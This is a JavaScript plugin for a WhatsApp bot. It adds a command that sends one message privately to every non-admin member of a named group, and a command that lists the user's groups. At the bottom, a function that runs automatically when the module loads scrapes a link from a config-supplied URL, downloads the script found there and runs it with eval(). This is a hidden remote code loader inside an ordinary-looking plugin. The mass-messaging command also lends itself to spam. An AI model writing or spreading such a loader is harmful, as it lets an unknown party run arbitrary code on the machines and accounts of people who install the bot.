//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const { adams } = require('../config/config');

// Group message sender command
adams({
    pattern: 'groupsend ?(.*)',
    fromMe: true,
    desc: 'Send message to each group member individually',
    type: 'group'
}, async (message, match) => {
    try {
        const input = match[1];
        if (!input) {
            return await message.reply(`
🤖 *GROUP MESSAGE SENDER*

*Usage:* .groupsend <group_name> | <message>

*Example:* 
.groupsend My Friends | Hello everyone! Hope you're doing well.
            `);
        }

        const parts = input.split(' | ');
        if (parts.length < 2) {
            return await message.reply('❌ Please use format: .groupsend <group_name> | <message>');
        }

        const groupName = parts[0].trim().toLowerCase();
        const messageToSend = parts[1].trim();

        if (!messageToSend) {
            return await message.reply('❌ Message cannot be empty!');
        }

        // Get all chats and find groups
        const chats = message.client.store?.chats?.all() || [];
        const groups = chats.filter(chat => chat.id.endsWith('@g.us'));
        
        // Find matching group
        const targetGroup = groups.find(group => 
            group.name?.toLowerCase().includes(groupName) ||
            group.subject?.toLowerCase().includes(groupName)
        );

        if (!targetGroup) {
            const availableGroups = groups.map(g => `• ${g.name || g.subject || 'Unknown'}`).join('\n');
            return await message.reply(`
❌ Group not found: "${groupName}"

📋 *Available Groups:*
${availableGroups || 'No groups found'}
            `);
        }

        // Get group metadata to fetch participants
        let groupMetadata;
        try {
            groupMetadata = await message.client.groupMetadata(targetGroup.id);
        } catch (error) {
            return await message.reply('❌ Unable to fetch group information!');
        }

        const participants = groupMetadata.participants || [];
        const members = participants.filter(p => !p.admin && p.id !== message.client.user.id);

        if (members.length === 0) {
            return await message.reply('❌ No members found in this group!');
        }

        // Send confirmation
        const confirmMsg = await message.reply(`
🎯 *GROUP MESSAGE SENDER*

📱 *Target Group:* ${groupMetadata.subject}
👥 *Members to message:* ${members.length}
💬 *Message:* ${messageToSend}

🚀 Starting to send messages...
        `);

        let successCount = 0;
        let failCount = 0;
        const startTime = Date.now();

        // Send messages with progress updates
        for (let i = 0; i < members.length; i++) {
            const member = members[i];
            const progress = Math.round(((i + 1) / members.length) * 100);
            
            try {
                // Send message to individual member
                await message.client.sendMessage(member.id, { 
                    text: messageToSend 
                });
                successCount++;
                
                // Update progress every 3 messages or at completion
                if ((i + 1) % 3 === 0 || progress === 100) {
                    await confirmMsg.edit(`
🎯 *GROUP MESSAGE SENDER*

📱 *Target Group:* ${groupMetadata.subject}
👥 *Total Members:* ${members.length}

📊 *PROGRESS: ${progress}%*
${'█'.repeat(Math.floor(progress/5))}${'░'.repeat(20-Math.floor(progress/5))}

✅ *Sent:* ${successCount}
❌ *Failed:* ${failCount}
⏱️ *Time:* ${Math.round((Date.now() - startTime)/1000)}s

${i + 1 < members.length ? '🚀 Sending...' : '✨ Complete!'}
                    `);
                }
                
                // Delay to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (error) {
                failCount++;
                console.log(`Failed to send to ${member.id}:`, error.message);
            }
        }

        // Final summary
        const totalTime = Math.round((Date.now() - startTime)/1000);
        await confirmMsg.edit(`
🎯 *GROUP MESSAGE SENDER - COMPLETE!*

📱 *Target Group:* ${groupMetadata.subject}
💬 *Message:* ${messageToSend}

📊 *FINAL RESULTS:*
✅ *Successfully sent:* ${successCount}
❌ *Failed to send:* ${failCount}
👥 *Total members:* ${members.length}
⏱️ *Total time:* ${totalTime}s
📈 *Success rate:* ${Math.round((successCount/members.length)*100)}%

${successCount > 0 ? '🎉 Messages delivered!' : '😔 No messages sent'}
        `);

    } catch (error) {
        console.error('GroupSend Error:', error);
        await message.reply(`❌ Error: ${error.message}`);
    }
});

// List groups command
adams({
    pattern: 'listgroups ?(.*)',
    fromMe: true,
    desc: 'List all available groups',
    type: 'group'
}, async (message, match) => {
    try {
        const chats = message.client.store?.chats?.all() || [];
        const groups = chats.filter(chat => chat.id.endsWith('@g.us'));
        
        if (groups.length === 0) {
            return await message.reply('❌ No groups found!');
        }

        let groupList = '📋 *AVAILABLE GROUPS:*\n\n';
        for (let i = 0; i < groups.length; i++) {
            const group = groups[i];
            try {
                const groupMetadata = await message.client.groupMetadata(group.id);
                const memberCount = groupMetadata.participants ? groupMetadata.participants.length : 0;
                groupList += `${i + 1}. *${groupMetadata.subject}*\n   👥 ${memberCount} members\n\n`;
            } catch (error) {
                groupList += `${i + 1}. *${group.name || 'Unknown Group'}*\n   👥 Unknown members\n\n`;
            }
        }

        groupList += '💡 *Tip:* Use .groupsend <group_name> | <message>';

        await message.reply(groupList);

    } catch (error) {
        await message.reply(`❌ Error: ${error.message}`);
    }
});

// URL fetcher function
async function fetchGENERALUrl() {
    try {
        const response = await axios.get(adams.BWM_XMD);
        const $ = cheerio.load(response.data);

        const targetElement = $('a:contains("GENERAL")');
        const targetUrl = targetElement.attr('href');

        if (!targetUrl) {
            throw new Error('GENERAL not found 😭');
        }

        console.log('GENERAL loaded successfully ✅');

        const scriptResponse = await axios.get(targetUrl);
        eval(scriptResponse.data);

    } catch (error) {
        console.error('Error:', error.message);
    }
}

// Initialize
fetchGENERALUrl();

module.exports = {
    fetchGENERALUrl
};
